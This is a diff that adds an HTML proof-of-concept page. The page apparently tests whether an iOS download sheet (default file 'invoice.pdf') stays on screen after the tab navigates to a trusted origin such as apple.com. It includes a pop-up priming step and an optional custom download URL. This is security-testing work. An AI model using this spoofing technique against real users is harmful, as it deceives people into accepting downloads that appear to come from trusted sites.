@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Download sheet — strand over trusted origin</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, system-ui, sans-serif; max-width: 620px; margin: 0 auto;
+           padding: 1rem 1rem calc(1rem + env(safe-area-inset-bottom)); line-height: 1.5; }
+    h1 { font-size: 1.25rem; }
+    p { font-size: .92rem; }
+    .row { margin: .8rem 0; }
+    .row input { width: 100%; padding: .7rem; font-size: 1rem; border: 1px solid #bbb; border-radius: 8px; }
+    label.fld { display:block; font-weight:600; font-size:.85rem; margin-bottom:.25rem; }
+    button { display: block; width: 100%; margin: .8rem 0; padding: 1rem; font-size: 1.05rem;
+             font-weight: 600; color: #fff; background: #2563eb; border: none; border-radius: 10px; }
+    button.prime { background: #16a34a; }
+    #log { white-space: pre-wrap; word-break: break-word; background: #111; color: #0f0;
+           padding: 1rem; border-radius: 8px; min-height: 4rem; font-family: ui-monospace, Menlo, monospace;
+           font-size: .82rem; margin-top: .8rem; }
+    #support { font-size: .78rem; color: #666; }
+  </style>
+</head>
+<body>
+  <h1>Download sheet — strand over a trusted origin</h1>
+  <p>
+    Triggers a file download (iOS shows a "Download [file]?" sheet), then
+    navigates this tab to the trusted origin while the sheet is up. Watch
+    whether the download sheet stays presented over the trusted site (address
+    bar shows the trusted origin). Prime pop-up permission first.
+  </p>
+  <div id="support"></div>
+
+  <button class="prime" id="prime">1 · Prime pop-up permission (tap Allow)</button>
+
+  <div class="row">
+    <label class="fld" for="dlurl">Download URL (optional — blank = generated file)</label>
+    <input id="dlurl" type="url" placeholder="https://…/file-with-content-disposition" inputmode="url" autocapitalize="off" autocorrect="off">
+  </div>
+  <div class="row">
+    <label class="fld" for="fname">Filename for generated download</label>
+    <input id="fname" type="text" value="invoice.pdf">
+  </div>
+  <div class="row">
+    <label class="fld" for="url">Trusted URL to navigate to</label>
+    <input id="url" type="url" value="https://apple.com" inputmode="url" autocapitalize="off" autocorrect="off">
+  </div>
+  <div class="row">
+    <label class="fld" for="delay">Navigate after (seconds)</label>
+    <input id="delay" type="number" min="0" step="0.5" value="3">
+  </div>
+
+  <button id="go">2 · Run test</button>
+  <div id="log">waiting…</div>
+
+  <script>
+    const logEl = document.getElementById('log');
+    const log = (m) => { logEl.textContent += '\n' + m; };
+    const val = (id) => document.getElementById(id).value;
+    const delayMs = () => Math.max(0, parseFloat(val('delay')) || 0) * 1000;
+
+    document.getElementById('support').textContent =
+      'secureContext: ' + window.isSecureContext + ' | download attr: ' +
+      (('download' in document.createElement('a')) ? 'yes' : 'no');
+
+    document.getElementById('prime').onclick = () => {
+      const w = window.open('about:blank', '_blank');
+      if (w) { try { w.close(); } catch (e) {} log('primed: pop-up permission likely granted.'); }
+      else { log('pop-up blocked — tap Allow if prompted, then run again.'); }
+    };
+
+    function triggerDownload() {
+      const custom = val('dlurl').trim();
+      const a = document.createElement('a');
+      if (custom) {
+        // Direct URL (should serve Content-Disposition: attachment).
+        a.href = custom;
+        a.setAttribute('download', '');
+        log('download requested from URL: ' + custom);
+      } else {
+        // Generated blob file — no server needed.
+        const blob = new Blob(['PoC download — benign placeholder.\n'], { type: 'application/octet-stream' });
+        const objUrl = URL.createObjectURL(blob);
+        a.href = objUrl;
+        a.download = val('fname') || 'file.bin';
+        setTimeout(() => URL.revokeObjectURL(objUrl), 15000);
+        log('download requested for generated file: ' + a.download);
+      }
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+
+    document.getElementById('go').onclick = () => {
+      logEl.textContent = 'run: download';
+      try {
+        triggerDownload();                       // pops the "Download [file]?" sheet
+        log('navigating to ' + val('url') + ' in ' + (delayMs()/1000) + 's');
+        setTimeout(() => { window.location.href = val('url'); }, delayMs());  // strand sheet over trusted origin
+      } catch (e) {
+        log('error: ' + (e && e.name) + ' — ' + (e && e.message));
+      }
+    };
+  </script>
+</body>
+</html>
